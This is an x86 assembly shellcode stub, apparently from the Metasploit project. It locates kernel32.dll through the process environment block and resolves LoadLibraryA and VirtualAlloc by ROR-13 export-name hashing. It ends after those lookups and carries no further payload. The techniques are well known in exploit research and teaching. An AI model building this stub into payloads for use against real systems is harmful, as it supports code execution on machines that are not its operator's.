;      Title:  Win32 API Loader
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com

[BITS 32]

global _start
_start:

    call LKernel32Base

LGetProcAddress:
	push ebx
	push ebp
	push esi
	push edi
	mov ebp, [esp + 24]			
	mov eax, [ebp + 0x3c]		
	mov edx, [ebp + eax + 120]
	add edx, ebp				
	mov ecx, [edx + 24]			
	mov ebx, [edx + 32]
	add ebx, ebp

LFnlp:
	jecxz	LNtfnd
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp				
	xor edi, edi
	cld

LHshlp:
	xor eax, eax
	lodsb
	cmp al, ah
	je LFnd
	ror edi, 13
	add edi, eax
	jmp short LHshlp

LFnd:	
	cmp edi, [esp + 20]
	jnz LFnlp
	mov ebx, [edx + 36]			
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]		
	mov ebx, [edx + 28]			
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]	
	add eax, ebp
	jmp short LDone

LNtfnd:
	xor eax, eax

LDone:
	pop edi
	pop esi
	pop ebp
	pop ebx
	ret 8

LKernel32Base:
    pop esi
    push byte 0x30
    pop ecx
    mov ebx, [fs:ecx]
    mov ebx, [ebx + 0x0c] 
    mov ebx, [ebx + 0x1c] 
    mov ebx, [ebx]		  
    mov ebx, [ebx + 0x08]

    push ebx                ; kernel32.dll base
    push 0xec0e4e8e         ; LoadLibraryA
    call esi                ; GetProcAddress(kerne32.dll, LoadLibrary)
    mov edi, eax
	
    push ebx                ; kernel32.dll base
    push 0x91afca54         ; VirtualAlloc
    call esi                ; GetProcAddress(kerne32.dll, VirtualAlloc)
   
    ; ebx = kernel32.dll base
    ; esi = LGetProcAddress
    ; edi = LoadLibraryA
	; eax = VirtualAlloc
